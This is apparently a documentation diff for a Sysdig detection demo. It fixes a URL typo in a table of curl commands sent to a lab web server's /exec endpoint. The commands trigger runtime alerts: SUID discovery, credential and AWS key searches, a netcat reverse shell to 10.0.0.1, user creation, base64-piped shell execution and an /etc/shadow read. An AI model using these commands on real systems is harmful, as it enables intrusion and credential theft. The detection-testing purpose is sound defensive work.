@@ -60,17 +60,17 @@ export WEBSERVERIP=192.168.1.15
 
 | Sysdig Event | Curl Command   |
 |---|---|
-| Reconnaissance attempt to find SUID binaries | `curl -X POST http://$WEBSERVERIP=/exec -d 'command=find / -perm -u=s -type f 2>/dev/null'` |
-| Dump memory for credentials | `curl -X POST http://$WEBSERVERIP=/exec -d 'command=grep passwd /proc/1/mem'` |
-| Find AWS Credentials | `curl -X POST http://$WEBSERVERIP=/exec -d 'command=grep aws_access_key_id /tmp/'` |
-| Netcat Remote Code Execution in Contianer | `curl -X POST http://$WEBSERVERIP=/exec -d 'command=nc -c bash 10.0.0.1 4242'` |
-| Suspicious Home Directory Creation | `curl -X POST http://$WEBSERVERIP=/exec -d 'command=adduser -h /dev/null -s /bin/sh test3 -D'` |
-| Base64-encoded Python Script Execution | `curl -X POST http://$WEBSERVERIP=/exec -d 'command=echo cHl0aG9uMyAtYyAnaW1wb3J0IF9faGVsbG9fXycK \| base64 -d \| sh'` |
-| Base64-encoded Shell Script Execution | `curl -X POST http://$WEBSERVERIP=/exec -d 'command=echo IyEvYmluL3NoCmVjaG8gIkhlbGxvIFdvcmxkIgo= \|base64 -d \|sh'` |
-| Base64'd ELF file on Command Line | `curl -X POST http://$WEBSERVERIP=/exec -d 'command=echo f0VMRgIB1M== \|base64 -d > hello'` |
+| Reconnaissance attempt to find SUID binaries | `curl -X POST http://$WEBSERVERIP/exec -d 'command=find / -perm -u=s -type f 2>/dev/null'` |
+| Dump memory for credentials | `curl -X POST http://$WEBSERVERIP/exec -d 'command=grep passwd /proc/1/mem'` |
+| Find AWS Credentials | `curl -X POST http://$WEBSERVERIP/exec -d 'command=grep aws_access_key_id /tmp/'` |
+| Netcat Remote Code Execution in Contianer | `curl -X POST http://$WEBSERVERIP/exec -d 'command=nc -c bash 10.0.0.1 4242'` |
+| Suspicious Home Directory Creation | `curl -X POST http://$WEBSERVERIP/exec -d 'command=adduser -h /dev/null -s /bin/sh test3 -D'` |
+| Base64-encoded Python Script Execution | `curl -X POST http://$WEBSERVERIP/exec -d 'command=echo cHl0aG9uMyAtYyAnaW1wb3J0IF9faGVsbG9fXycK \| base64 -d \| sh'` |
+| Base64-encoded Shell Script Execution | `curl -X POST http://$WEBSERVERIP/exec -d 'command=echo IyEvYmluL3NoCmVjaG8gIkhlbGxvIFdvcmxkIgo= \|base64 -d \|sh'` |
+| Base64'd ELF file on Command Line | `curl -X POST http://$WEBSERVERIP/exec -d 'command=echo f0VMRgIB1M== \|base64 -d > hello'` |
 
 > **Sysdig Managed Policy: Sysdig Runtime Notable Events (Severity: Medium)**
 
 | Sysdig Event | Curl Command   |
 |---|---|
-| Read sensitive file untrusted | `curl http://$WEBSERVERIP=/etc/shadow` |
+| Read sensitive file untrusted | `curl http://$WEBSERVERIP/etc/shadow` |
